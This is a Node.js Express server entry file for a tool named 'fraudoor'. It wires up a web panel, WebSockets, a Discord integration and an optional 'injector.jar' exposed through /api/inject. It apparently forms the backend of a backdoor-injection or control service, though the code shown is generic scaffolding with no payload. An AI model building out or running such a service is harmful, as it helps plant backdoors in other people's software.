import express from 'express';
import cors from 'cors';
import { createServer } from 'http';
import { WebSocketServer } from 'ws';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';
import { existsSync } from 'fs';
import { apiRouter } from './api.js';
import { setupWebSocket } from './ws.js';
import { initStore } from './store.js';
import { initDiscord } from './discord.js';
import { initUsers } from './users.js';

const PORT = process.env.PORT || 8080;
const __dirname = dirname(fileURLToPath(import.meta.url));

const app = express();
const server = createServer(app);

app.use(cors());
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ extended: true, limit: '100mb' }));

const publicDir = join(__dirname, '..', 'public');
app.use(express.static(publicDir));

app.use('/api', apiRouter);

app.get('/health', (req, res) => res.json({ status: 'ok' }));

app.get('*', (req, res) => {
  if (!req.path.startsWith('/api') && !req.path.startsWith('/ws')) {
    const indexPath = join(publicDir, 'index.html');
    if (existsSync(indexPath)) return res.sendFile(indexPath);
    res.json({ service: 'fraudoor', status: 'running', panel: 'build panel with: cd panel && npm run build && cp -r dist ../server/public' });
  }
});

const wss = new WebSocketServer({ server, path: '/ws' });
const store = initStore();
initUsers();

setupWebSocket(wss, store);
initDiscord(store, wss);

const injectorExists = existsSync(join(__dirname, '..', 'injector.jar'));

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[fraudoor] server running on port ${PORT}`);
  if (injectorExists) console.log('[fraudoor] injector service ready');
  else console.log('[fraudoor] injector.jar not found - injection via /api/inject unavailable');
});
